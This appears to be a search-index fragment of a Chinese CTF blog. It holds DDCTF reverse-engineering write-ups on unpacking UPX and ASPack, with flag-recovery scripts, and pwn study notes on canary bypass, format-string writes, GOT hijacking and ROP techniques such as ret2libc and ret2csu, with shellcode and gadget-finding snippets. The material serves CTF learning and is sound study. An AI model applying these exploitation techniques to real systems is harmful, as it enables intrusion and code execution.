\u8ddf\u4e0a\u9762\u4e00\u6837\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u6211\u76f4\u63a5\u627e\u4e86popa\uff0c\u5176\u5b9e\u539f\u7406\u662f\u4e00\u6837\u7684\u3002 \u8131\u58f3\u5b8c\u540e\u5355\u6b65\u8c03\u8bd5\u3002\u770b\u5230\u660e\u663e\u7684\u63d0\u793a\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u4e4b\u540e\u6709\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u6570\u636e\uff0c\u8001\u89c4\u77e9C\u4e00\u4e0b\uff0cU\u6389\u518dP\uff0c\u5206\u6790\u51fd\u6570\uff0c\u518dF5\u5373\u53ef\u3002 \u5173\u952e\u51fd\u6570\u57281271240\u5904\u3002\u91cc\u9762\u903b\u8f91\u4e5f\u5f88\u7b80\u5355\uff0c\u8fd9\u6b21\u4e3b\u8981\u4e3a\u4e86\u8131\u58f3\uff0c\u5c31\u4e0d\u518d\u5206\u6790\u4e86\u3002 \u811a\u672c\uff1a flag = \"reverse+\" origin = \"\" constant = [ 0x37 , 0x34 , 0x35 , 0x32 , 0x33 , 0x30 , 0x31 , 0x3E , 0x3F , 0x3C , 0x3D , 0x3A , 0x3B , 0x38 , 0x39 , 0x26 , 0x27 , 0x24 , 0x25 , 0x22 , 0x23 , 0x20 , 0x21 , 0x2E , 0x2F , 0x2C , 0x17 , 0x14 , 0x15 , 0x12 , 0x13 , 0x10 , 0x11 , 0x1E , 0x1F , 0x1C , 0x1D , 0x1A , 0x1B , 0x18 , 0x19 , 0x06 , 0x07 , 0x04 , 0x05 , 0x02 , 0x03 , 0x00 , 0x01 , 0x0E , 0x0F , 0x0C , 0x46 , 0x47 , 0x44 , 0x45 , 0x42 , 0x43 , 0x40 , 0x41 , 0x4E , 0x4F , 0x5D , 0x59 , 0x01 , 0x00 , 0x00 , 0x00 , 0xA8 , 0x1A , 0x73 , 0x01 , 0xA0 , 0x37 , 0x73 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 ] def change ( one ): if one >= 0 and one <= 9 : return one + 48 elif one >= 10 and one <= 15 : return one + 55 backone = [] for i in flag : temp = ord ( i ) ^ 0x76 temp = constant . index ( temp ) backone . append ( temp ) print hex ( temp ), print \"\" backtwo = \"\" for i in range ( 0 , len ( backone ), 4 ): a = backone [ i ] << 2 a += (( backone [ i + 1 ] & 0xf0 ) >> 4 ) & 0x3 b = ( backone [ i + 1 ] & 0xf ) << 4 b += ( backone [ i + 2 ] & 0x3c ) >> 2 c = ( backone [ i + 2 ] & 0x3 ) << 6 c += backone [ i + 3 ] print hex ( a ), hex ( b ), hex ( c ) backtwo += chr ( a ) backtwo += chr ( b ) backtwo += chr ( c ) PS\uff1a \u00b6 \u8fd9\u4e2a\u662f\u590d\u73b0\u7684\u8bb0\u5f55\uff0c\u57fa\u672c\u8ddf\u505a\u7684\u65f6\u5019\u64cd\u4f5c\u4e00\u6837\u3002\u4e0d\u8fc7\u4e00\u5f00\u59cb\u505a\u7684\u65f6\u5019\u6709\u4e00\u6b21\u6808\u5206\u6790\u9519\u8bef\uff0c\u590d\u73b0\u7684\u65f6\u5019\u6ca1\u6709\u51fa\u73b0\u3002\u4e0b\u9762\u8865\u5145\u4e0b\u89e3\u51b3\u65b9\u6cd5\u3002 \u5148Options->General->Disassembly->Stack pointer\u52fe\u9009\u4e0a\u3002\u4e4b\u540e\u5728\u6c47\u7f16\u6307\u4ee4\u9694\u58c1\u80fd\u770b\u5230\u591a\u4e86\u4e9b\u6570\u5b57\uff0c\u8fd9\u4e2a\u662f\u5f53\u524d\u6808\u6307\u9488\u76f8\u5bf9ebp\u7684\u504f\u79fb\u3002 \u7136\u540e\u89c2\u5bdf\u51fd\u6570\u5c3e\u90e8\uff0c\u5bf9\u4e8e\u628a\u5e73\u8861\u6808\u4efb\u52a1\u4ea4\u7ed9\u88ab\u8c03\u7528\u8005\u7684\u51fd\u6570\u8c03\u7528\uff0c\u51fd\u6570\u6267\u884c\u5230retn\u65f6\uff0cesp\u5e94\u8be5\u4e3a0\u3002\u5982\u679c\u53d1\u73b0esp\u4e0d\u4e3a0\u8bf4\u660e\u6709\u95ee\u9898\u3002\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u8c03\u6574\u3002Edit->Functions->Change stack pointer\uff0c\u6216\u8005\u5feb\u6377\u952eALT+K\uff0c\u628a\u6307\u5b9a\u884c\u7684esp\u8c03\u6574\uff0c\u76f4\u5230\u6700\u540eesp\u504f\u79fb\u4e3a0\u5373\u53ef\u3002","title":"\u901a\u8fc7DDCTF\u4e24\u9053\u9006\u5411\u9898\u7ec3\u4e60\u8131\u58f3"},{"location":"CTF WP/\u901a\u8fc7DDCTF\u4e24\u9053\u9006\u5411\u9898\u7ec3\u4e60\u8131\u58f3/#_1","text":"\u4e4b\u524d\u8fd8\u6ca1\u7528\u8fc7IDA\u5728windows\u4e0a\u8c03\u8bd5\uff0c\u90fd\u662f\u7528OD\u6216\u8005xdbg\u3002\u8fd9\u6b21\u672c\u6765\u4e5f\u60f3\u5728OD\u8131\u7684\uff0c\u7ed3\u679c\u592a\u83dc\u4e86\u4e00\u8fdb\u53bb\u5c31\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u60c5\u51b5\u4e86\u3002\u3002\u3002\u60f3\u7740\u8fd8\u662fIDA\u8212\u670d\uff0c\u8d81\u673a\u5b66\u4e00\u4e0b\u3002\u7ed3\u5408IDA\u5728linux\u7684\u8c03\u8bd5\u8981\u5f00\u8c03\u8bd5\u8fdb\u7a0b\uff0c\u5728IDA\u7684\u6587\u4ef6\u5939\u4e0b\u641c\u5230\u4e86\u8fd9\u4e2a\uff1a \u8fd9\u9898\u662f32\u4f4d\u7684\uff0c\u6240\u4ee5\u8fd0\u884c\u6700\u4e0a\u9762\u7684\u90a3\u4e2a\u3002\u7136\u540e\u5728IDA\u9009\u62e9Debugger->Select debugger->Local Windows debugger\u3002","title":"\u524d\u7f6e\u5de5\u4f5c\uff1a"},{"location":"CTF WP/\u901a\u8fc7DDCTF\u4e24\u9053\u9006\u5411\u9898\u7ec3\u4e60\u8131\u58f3/#reverse1_final","text":"\u5148IDA\u5206\u6790\uff0c\u6bb5\u540d\u79f0\u53ebUPX1\u3001UPX2\uff0c\u56e0\u6b64\u5f88\u5927\u53ef\u80fd\u662fUPX\u58f3\u3002PEID\u67e5\u4e86\u4e00\u4e0b\u4e5f\u786e\u5b9e\u662fUPX\u58f3\u3002\u524d\u9762\u4e00\u5806\u538b\u7f29\u7684\u4fe1\u606f\uff0c\u6ca1\u4ec0\u4e48\u610f\u4e49\u3002\u76f4\u63a5\u770b\u540e\u9762\u3002 \u4e00\u5f00\u59cb\u5c31\u662f\u4e2apusha\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528esp\u5b9a\u5f8b\u8131\u58f3\uff0c\u53ef\u4ee5\u5728pusha\u540e\uff0c\u5bf9\u5f53\u524desp\u6240\u5728\u4f4d\u7f6e\u4e0b\u786c\u4ef6\u8bbf\u95ee\u65ad\u70b9\u3002F9\u6267\u884c\u3002 F9\u5b8c\u8df3\u52300x917C47\uff0c\u540e\u9762\u6709\u4e2a\u5c0f\u5faa\u73af\uff0c\u6240\u4ee5\u57280x917C51\u4e0b\u4e2a\u65ad\u70b9\u518dF9\uff0c\u5c31\u51fa\u6765\u4e86\u3002\u4e00\u76f4\u5355\u6b65\uff0c\u770b\u5230\u8fd0\u884c\u523012AA\u5c31\u505c\u4e86\uff0c\u770b\u63a7\u5236\u53f0\u7b49\u5f85\u8f93\u5165\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5e94\u8be5\u662f\u4e3b\u8981\u8fd0\u884c\u7a0b\u5e8f\u3002\u8ddf\u8fdb\u53bb\u770b\uff0c\u53d1\u73b0\u80fdF5\u4e86\uff0c\u800c\u4e14\u6709\u63d0\u793a\u8f93\u51fa\u548c\u8bfb\u5165\u6570\u636e\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5927\u6982\u7387\u662fmain\u51fd\u6570\u3002\u4f46\u662f\u53ea\u6709printf\u548cscanf\uff0c\u611f\u89c9\u5206\u6790\u4e0d\u5b8c\u5168\uff0c\u518d\u5230\u6c47\u7f16\u770b\u770b\u3002 \u770b\u4e0a\u53bb\u4e0d\u662f\u6b63\u5e38\u7684\u7ed3\u5c3e\u3002\u518d\u5f80\u540e\u770b\u8fd8\u6709\u4e00\u4e9b\u96f6\u96f6\u6563\u6563\u7684\u7a0b\u5e8f\u3002\u5bf9\u7a0b\u5e8f\u788e\u7247\u8fdb\u884cC\u64cd\u4f5c\uff0c\u7ec4\u5408\u6210\u7a0b\u5e8f\u5757\u65b9\u4fbf\u540e\u9762\u64cd\u4f5c\u3002\u56e0\u6b64\u628a\u5f53\u524d\u51fd\u6570\u548c\u540e\u9762\u7684\u90e8\u5206\u51fd\u6570U\u6389\uff0c\u518d\u91cd\u65b0P\u4e00\u4e0b\u8fdb\u884c\u51fd\u6570\u5206\u6790\uff0cF5\u770b\u4e0b\uff0c\u5c31\u80fd\u5f97\u5230\u770b\u4e0a\u53bb\u8f83\u4e3a\u6b63\u5e38\u7684\u7a0b\u5e8f\u3002 \u770b\u4e0a\u53bb\u4e3b\u8981\u7684\u8fd0\u7b97\u90fd\u5728DD1000\u90a3\u4e2a\u51fd\u6570\uff0c\u8fdb\u53bb\u770b\u770b\u3002\u70b9\u8fdb\u53bb\u770b\u4ec0\u4e48\u90fd\u6ca1\u6709\uff0c\u5230\u6c47\u7f16\u5c42\u9762\u770b\u770b\u3002\u770b\u5230\u4e5f\u662f\u96f6\u96f6\u6563\u6563\u7684\u7a0b\u5e8f\u3002C\u4e00\u4e0b\u76f4\u63a5\u5bf9DD1000\u51fd\u6570\u8fdb\u884cF5\uff0c\u76f4\u63a5\u80fd\u5206\u6790\u51fa\u6765\u4e86\u3002 \u540e\u9762\u90fd\u662f\u975e\u5e38\u7b80\u5355\u7684\u903b\u8f91\u4e86\u3002\u5c06\u8f93\u5165\u548c\u5e38\u91cf\u8868\u64cd\u4f5c\u4e00\u4e0b\uff0c\u7136\u540e\u548cDDCTF{reverseME}\u8fdb\u884c\u6bd4\u8f83\uff0c\u6b63\u786e\u5c31\u8fc7check\u4e86\u3002\u53ea\u8981\u9006\u8fd0\u7b97\u4e00\u4e0b\u5c31\u80fd\u5f97\u5230\u6b63\u786e\u8f93\u5165\uff0c\u5373flag\u3002 \u811a\u672c\uff1a flag = \"DDCTF{reverseME}\" constant = [ 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xBA , 0xA5 , 0x0D , 0x34 , 0x45 , 0x5A , 0xF2 , 0xCB , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFE , 0xFF , 0xFF , 0xFF , 0x01 , 0x00 , 0x00 , 0x00 , 0x7E , 0x7D , 0x7C , 0x7B , 0x7A , 0x79 , 0x78 , 0x77 , 0x76 , 0x75 , 0x74 , 0x73 , 0x72 , 0x71 , 0x70 , 0x6F , 0x6E , 0x6D , 0x6C , 0x6B , 0x6A , 0x69 , 0x68 , 0x67 , 0x66 , 0x65 , 0x64 , 0x63 , 0x62 , 0x61 , 0x60 , 0x5F , 0x5E , 0x5D , 0x5C , 0x5B , 0x5A , 0x59 , 0x58 , 0x57 , 0x56 , 0x55 , 0x54 , 0x53 , 0x52 , 0x51 , 0x50 , 0x4F , 0x4E , 0x4D , 0x4C , 0x4B , 0x4A , 0x49 , 0x48 , 0x47 , 0x46 , 0x45 , 0x44 , 0x43 , 0x42 , 0x41 , 0x40 , 0x3F , 0x3E , 0x3D , 0x3C , 0x3B , 0x3A , 0x39 , 0x38 , 0x37 , 0x36 , 0x35 , 0x34 , 0x33 , 0x32 , 0x31 , 0x30 , 0x2F , 0x2E , 0x2D , 0x2C , 0x2B , 0x2A , 0x29 , 0x28 , 0x27 , 0x26 , 0x25 , 0x24 , 0x23 , 0x22 , 0x21 , 0x20 , 0x00 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 , 0x1B , 0xD5 , 0x00 ] print len ( constant ) origin = \"\" for i in flag : origin += chr ( constant [ ord ( i )]) print origin","title":"reverse1_final\uff1a"},{"location":"CTF WP/\u901a\u8fc7DDCTF\u4e24\u9053\u9006\u5411\u9898\u7ec3\u4e60\u8131\u58f3/#reverse2_final","text":"peid\u67e5\u4e00\u4e0b\uff0c\u53d1\u73b0\u53c8\u52a0\u4e86\u58f3\u3002\u8fd9\u6b21\u662fASPack\u58f3\u3002 \u8ddf\u4e0a\u9762\u4e00\u6837\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u6211\u76f4\u63a5\u627e\u4e86popa\uff0c\u5176\u5b9e\u539f\u7406\u662f\u4e00\u6837\u7684\u3002 \u8131\u58f3\u5b8c\u540e\u5355\u6b65\u8c03\u8bd5\u3002\u770b\u5230\u660e\u663e\u7684\u63d0\u793a\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u4e4b\u540e\u6709\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u6570\u636e\uff0c\u8001\u89c4\u77e9C\u4e00\u4e0b\uff0cU\u6389\u518dP\uff0c\u5206\u6790\u51fd\u6570\uff0c\u518dF5\u5373\u53ef\u3002 \u5173\u952e\u51fd\u6570\u57281271240\u5904\u3002\u91cc\u9762\u903b\u8f91\u4e5f\u5f88\u7b80\u5355\uff0c\u8fd9\u6b21\u4e3b\u8981\u4e3a\u4e86\u8131\u58f3\uff0c\u5c31\u4e0d\u518d\u5206\u6790\u4e86\u3002 \u811a\u672c\uff1a flag = \"reverse+\" origin = \"\" constant = [ 0x37 , 0x34 , 0x35 , 0x32 , 0x33 , 0x30 , 0x31 , 0x3E , 0x3F , 0x3C , 0x3D , 0x3A , 0x3B , 0x38 , 0x39 , 0x26 , 0x27 , 0x24 , 0x25 , 0x22 , 0x23 , 0x20 , 0x21 , 0x2E , 0x2F , 0x2C , 0x17 , 0x14 , 0x15 , 0x12 , 0x13 , 0x10 , 0x11 , 0x1E , 0x1F , 0x1C , 0x1D , 0x1A , 0x1B , 0x18 , 0x19 , 0x06 , 0x07 , 0x04 , 0x05 , 0x02 , 0x03 , 0x00 , 0x01 , 0x0E , 0x0F , 0x0C , 0x46 , 0x47 , 0x44 , 0x45 , 0x42 , 0x43 , 0x40 , 0x41 , 0x4E , 0x4F , 0x5D , 0x59 , 0x01 , 0x00 , 0x00 , 0x00 , 0xA8 , 0x1A , 0x73 , 0x01 , 0xA0 , 0x37 , 0x73 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 ] def change ( one ): if one >= 0 and one <= 9 : return one + 48 elif one >= 10 and one <= 15 : return one + 55 backone = [] for i in flag : temp = ord ( i ) ^ 0x76 temp = constant . index ( temp ) backone . append ( temp ) print hex ( temp ), print \"\" backtwo = \"\" for i in range ( 0 , len ( backone ), 4 ): a = backone [ i ] << 2 a += (( backone [ i + 1 ] & 0xf0 ) >> 4 ) & 0x3 b = ( backone [ i + 1 ] & 0xf ) << 4 b += ( backone [ i + 2 ] & 0x3c ) >> 2 c = ( backone [ i + 2 ] & 0x3 ) << 6 c += backone [ i + 3 ] print hex ( a ), hex ( b ), hex ( c ) backtwo += chr ( a ) backtwo += chr ( b ) backtwo += chr ( c )","title":"reverse2_final:"},{"location":"CTF WP/\u901a\u8fc7DDCTF\u4e24\u9053\u9006\u5411\u9898\u7ec3\u4e60\u8131\u58f3/#ps","text":"\u8fd9\u4e2a\u662f\u590d\u73b0\u7684\u8bb0\u5f55\uff0c\u57fa\u672c\u8ddf\u505a\u7684\u65f6\u5019\u64cd\u4f5c\u4e00\u6837\u3002\u4e0d\u8fc7\u4e00\u5f00\u59cb\u505a\u7684\u65f6\u5019\u6709\u4e00\u6b21\u6808\u5206\u6790\u9519\u8bef\uff0c\u590d\u73b0\u7684\u65f6\u5019\u6ca1\u6709\u51fa\u73b0\u3002\u4e0b\u9762\u8865\u5145\u4e0b\u89e3\u51b3\u65b9\u6cd5\u3002 \u5148Options->General->Disassembly->Stack pointer\u52fe\u9009\u4e0a\u3002\u4e4b\u540e\u5728\u6c47\u7f16\u6307\u4ee4\u9694\u58c1\u80fd\u770b\u5230\u591a\u4e86\u4e9b\u6570\u5b57\uff0c\u8fd9\u4e2a\u662f\u5f53\u524d\u6808\u6307\u9488\u76f8\u5bf9ebp\u7684\u504f\u79fb\u3002 \u7136\u540e\u89c2\u5bdf\u51fd\u6570\u5c3e\u90e8\uff0c\u5bf9\u4e8e\u628a\u5e73\u8861\u6808\u4efb\u52a1\u4ea4\u7ed9\u88ab\u8c03\u7528\u8005\u7684\u51fd\u6570\u8c03\u7528\uff0c\u51fd\u6570\u6267\u884c\u5230retn\u65f6\uff0cesp\u5e94\u8be5\u4e3a0\u3002\u5982\u679c\u53d1\u73b0esp\u4e0d\u4e3a0\u8bf4\u660e\u6709\u95ee\u9898\u3002\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u8c03\u6574\u3002Edit->Functions->Change stack pointer\uff0c\u6216\u8005\u5feb\u6377\u952eALT+K\uff0c\u628a\u6307\u5b9a\u884c\u7684esp\u8c03\u6574\uff0c\u76f4\u5230\u6700\u540eesp\u504f\u79fb\u4e3a0\u5373\u53ef\u3002","title":"PS\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/","text":"\u8bb0\u5f55\u4e86\u5b66\u4e60pwn\u4ee5\u6765\u7684\u4e00\u4e9b\u5bb9\u6613\u5fd8\u7684\u7b14\u8bb0 canary \u00b6 canary\u7ed5\u8fc7\uff1a \u00b6 \u6cc4\u9732canary: canary\u4ee5\\x00\u7ed3\u5c3e\uff0c\u9700\u8981\u8986\u76d6\u6389\\x00\uff0c\u6cc4\u9732\u51facanary\uff0c\u7136\u540e\u518d\u6267\u884c\u6ea2\u51fa\u63a7\u5236\u8fd0\u884c\u8fc7\u7a0b\u3002 \u52ab\u6301\uff1a__stack_chk_failed\u51fd\u6570\uff1a \u00b6 \u5df2\u77e5 Canary \u5931\u8d25\u7684\u5904\u7406\u903b\u8f91\u4f1a\u8fdb\u5165\u5230 __stack_chk_failed \u51fd\u6570\uff0c\u4fee\u6539GOT\u8868\u3002 \u6545\u610f\u89e6\u53d1canary\uff08SSP leak\uff09\uff1a \u00b6 __stack_chk_failed\u51fd\u6570\u4e2d\u4f1a\u8f93\u51faargv[0]\uff0c\u53ef\u6784\u9020\u8db3\u591f\u957f\u7684\u5b57\u7b26\u4e32\u8986\u76d6\u6389argv[0]\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u3002\uff08\u8be6\u89c1\u9644\u5f55\uff09 \u9644\u5f55\uff1a https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/ \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u00b6 \u57fa\u672c\u77e5\u8bc6\uff1a \u00b6 n$:\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570 hh:\u4e00\u4e2a\u5b57\u8282 h:\u53cc\u5b57\u8282 %p:\u5341\u516d\u8fdb\u5236\u5730\u5740\u683c\u5f0f\u6253\u5370\u53d8\u91cf\u7684\u503c %n:\u4e0d\u8f93\u51fa\uff0c\u628a\u5df2\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf %%:\u8f93\u51fa\u4e00\u4e2a% \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58\uff1a \u00b6 \u7528:[tag]%p%p%p%p%p%p... \u6765\u6d4b\u8bd5\u9700\u8981\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff08\u6076\u610f\uff09\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002 \u8986\u76d6\u5185\u5b58\uff1a \u00b6 ...[overwrite addr]....%[overwrite offset]$n \u627e\u5230\u5730\u5740\uff0c\u7136\u540e\u786e\u5b9a\u8be5\u5730\u5740\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002 \u8986\u76d6\u5c0f\u6570\u5b57\uff1a\u524d\u9762\u653epadding\uff0c\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u540e\u9762\u3002 \u8986\u76d6\u5927\u6570\u5b57\uff1a\u4f7f\u7528%hhn\u622a\u65ad\uff0c\u6309\u6bcf\u4e2a\u5b57\u8282\u5199\u5165 Hijack GOT: \u00b6 \u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\uff0c\u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\uff0c\u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002 Pwntools\u7684fmtstr_payload\u51fd\u6570\uff0c\u4f8b\u5982\uff1afmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u8fd9\u4e2a\u6570\u636e\u3002 Hijack Retaddr\uff1a \u00b6 \u76f4\u63a5\u4fee\u6539\u4e3a\u60f3\u8981\u8df3\u8f6c\u7684\u5730\u5740\u3002 \u6808\u6ea2\u51fa \u00b6 \u57fa\u672c\u77e5\u8bc6\uff1a \u00b6 1\u3001\u5c40\u90e8\u53d8\u91cf\u548c\u5168\u5c40\u53d8\u91cf\u90fd\u662f\u5148\u5b9a\u4e49\u7684\u5728\u4f4e\u5730\u5740\uff0c\u540e\u5b9a\u4e49\u7684\u5728\u9ad8\u5730\u5740\u3002 2\u3001ELF\u7f16\u8bd1\u65f6\u52a0\u4e86PIE\u9009\u9879\u540e\u4e3aso\u6587\u4ef6 3\u3001plt\u8868\u5b58got\u8868\u9879\u5730\u5740\uff0cgot\u8868\u5b58\u7684\u662f\u771f\u6b63\u7684\u51fd\u6570\u5730\u5740\uff08\u5728\u672a\u8c03\u7528\u8fc7\u4e00\u6b21\u51fd\u6570\u524d\uff0cgot\u8868\u5b58\u7684\u662fplt\u8868\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\uff0c\u8c03\u7528\u8fc7\u4e00\u6b21\u4e4b\u540e\u624d\u662f\u771f\u6b63\u51fd\u6570\u5730\u5740\uff09\u3002plt\u8868\u5728\u4ee3\u7801\u6bb5\uff0cgot\u8868\u5728\u6570\u636e\u6bb5\uff0cplt\u8868\u53ef\u4ee5\u8df3\u5230got\u8868\u5730\u5740\u3002 4\u3001readelf -r ./filename\u67e5\u770bgot\u8868 5\u3001\u6539\u8868\u5185\u5bb9\u4e00\u822cGOT\u8868\uff0c\u6539\u8fd4\u56de\u5730\u5740\u6539\u4e3aPLT\u8868\u5730\u5740\u6216\u8005GOT\u8868\u5730\u5740\u90fd\u53ef\u4ee5\u3002 6\u3001libc\u4e2d\u627e\u201d/bin/sh\u201d\uff1alibc.search(\u2018/bin/sh\u2019).next() 7\u3001enter\u548cleave\u4e00\u7ec4\uff0ccall\u548cret\u4e00\u7ec4\u3002 call: push rip; jmp target; ret: pop rip enter: push rbp; mov rbp,rsp leave: mov rsp,rbp; pop rbp 8\u3001gets\u51fd\u6570\u9047\u5230\u56de\u8f66\u624d\u7ed3\u675f\uff0c\u56de\u8f66\u88ab\u81ea\u52a8\u8f6c\u6362\u6210\u2019\\0\u2019\u5b58\u5230\u5b57\u7b26\u4e32\u3002read\u51fd\u6570\u65e00\u622a\u65ad\u3002 9\u3001gdb\u9ed8\u8ba4\u5173\u95edASLR\uff0c\u8981\u5f00\u542f\u9700\u8981\uff1aset disable-randomization off ret2text: \u00b6 \u76f4\u63a5\u6ea2\u51fa\u6539\u8fd4\u56de\u5730\u5740 ret2shellcode: \u00b6 vmmap\u67e5\u770b\u6bb5\u6267\u884c\u6743\u9650\uff0c\u4f8b\u5982bss\u6bb5\u3002\u628ashellcode\u653e\u5230bss\u6bb5\u4e2d\uff0c\u6539\u8fd4\u56de\u5730\u5740\u8df3\u8f6c\u5230shellcode\u3002 shellcode = asm(shellcraft.sh()) \u6ce8\u610f64\u4f4d\u8981\u4fee\u6539\uff1acontext.bits=64 ; context.arch='amd64' ret2syscall: \u00b6 \u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6shell\u3002 execve(\"/bin/sh\",NULL,NULL) 32\u4f4d\u7cfb\u7edf\uff1aeax\u4e3a\u7cfb\u7edf\u8c03\u7528\u53f70xb\uff0cebx\u6307\u5411/bin/sh\u5730\u5740\uff0cecx\u3001edx\u4e3a0\u3002 \u7528ROPgadget\u627egadget\uff1a ROPgadget --binary filename --only \u2018pop|ret\u2019 |grep \u2018ebx\u2019 \u627e/bin/sh\u5730\u5740\uff1a ROPgadget --binary filename --string \u2018/bin/sh\u2019 \u627eint 0x80: ROPgadget --binary filename --only \u2018int\u2019 \u4ee5\u4e0a\u4e3a32\u4f4d\uff0c64\u4f4d\u7684\u4e0d\u540c\u4e4b\u5904\u9664\u4e86\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u4e4b\u5916\uff0c64\u4f4d\u5e76\u4e0d\u4f7f\u7528int 0x80\uff0c\u800c\u662f\u4f7f\u7528syscall\uff0c\u4e24\u8005\u673a\u5668\u7801\u5e76\u4e0d\u76f8\u540c\u3002 32\u4f4dexecve\u8c03\u7528\u53f7\u662f0xb\uff0c64\u4f4d\u662f0x3b\uff0c\u4e24\u8005\u90fd\u662f\u5b58\u5728eax(rax)\u5bc4\u5b58\u5668\u4e2d ret2libc: \u00b6 \u6cc4\u9732 __libc_start_main \u5730\u5740 \u83b7\u53d6 libc \u7248\u672c \u83b7\u53d6 system \u5730\u5740\u4e0e /bin/sh \u7684\u5730\u5740 \u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f \u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884c system(\u2018/bin/sh\u2019) Ret2libc3\u8981\u6ce8\u610f\u5f00\u59cb\u65f6\u628aesp\u8fdb\u884c\u4e86and\u64cd\u4f5c\uff0c\u6700\u4f4e4\u4f4d\u6e050 ret2csu: \u00b6 \u5229\u7528__libc_csu_init\u51fd\u6570\u4e2d\u7684gadgets\uff0c\u53ef\u4ee5\u63a7\u5236rbx,rbp,r12,r13,r14,r15\u7684\u6570\u636e\uff0c\u5176\u4e2d\u53ef\u4ee5\u901a\u8fc7r13,r14,r15\u63a7\u5236rdx,rsi,edi\u7684\u6570\u636e\uff0c\u901a\u8fc7rbx\u548cr12\u7684\u914d\u5408\u63a7\u5236\u8df3\u8f6c\u5230\u60f3\u8981\u7684\u51fd\u6570\u3002\u6ce8\u610f\u662fcall qword ptr [r12+rbx*8]\uff0c\u4f1a\u5148\u53d6\u5730\u5740\u5185\u5bb9\u518d\u8df3\u8f6c\uff0c\u6240\u4ee5\u4e0d\u80fd\u586bplt\u8868\u800c\u5e94\u8be5\u662fgot\u8868\u3002 \u63a7\u5236rbx+1=rbp\uff0c\u5219\u4e0d\u4f1a\u8df3\u8f6c\uff0c\u8fdb\u884c\u987a\u5e8f\u6267\u884c\u3002\u4f46\u662f\u8981\u6ce8\u610f\u4f1a\u4e00\u76f4\u6267\u884c\u5230retn\uff0c\u6240\u4ee5\u8981\u6784\u9020padding\u957f\u5ea6\u4e3a0x38\u7528\u6765pop\u3002 libc_csu_init\u7684\u5c3e\u90e8\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\uff0c\u8fd8\u80fd\u63a7\u5236rbp\u548crsi\u5bc4\u5b58\u5668\u3002 ret2dl_resolve: \u00b6 \u53c2\u8003\uff1a http://pwn4.fun/2016/11/09/Return-to-dl-resolve/\uff1b http://rk700.github.io/2015/08/09/return-to-dl-resolve/ \uff08\u8fd9\u4e2a\u6ca1\u770b\uff0c\u6709\u7a7a\u770b\u770b\uff09 Stage1\uff1a\u666e\u901aROP Stage2\uff1a\u63a7\u5236\u8fd4\u56de\u5730\u5740\u4e3aplt[0]\uff0c\u7136\u540e\u6267\u884cpush GOT 1 \uff0cjmp GOT[2]\uff0c\u8c03\u7528_dl_runtime_resolve(linkmap,reloc_arg)\uff0c\u76f8\u5f53\u4e8e\u4eba\u4e3a\u8df3\u8fc7\u4e86PLT\u8868\u9879\u5f00\u59cb\u65f6\u90a3\u90e8\u5206\u64cd\u4f5c\uff08\u5c31\u662f\u8c03\u7528\u51fd\u6570\u5230PLT\u65f6\u6709\u4e09\u90e8\u5206\u64cd\u4f5c\u561b\uff0cJMP\u3001PUSH\u3001JMP\uff0c\u7136\u540e\u8fd9\u4e2a\u7684\u505a\u6cd5\u5c31\u662f\u8df3\u8fc7\u4e86\u7b2c\u4e00\u4e2aJMP\uff0c\u624b\u52a8PUSH\u504f\u79fb\uff0c\u7136\u540e\u7b2c\u4e09\u4e2aJMP\u5c31\u662f\u8df3\u5230PLT[0]\uff09 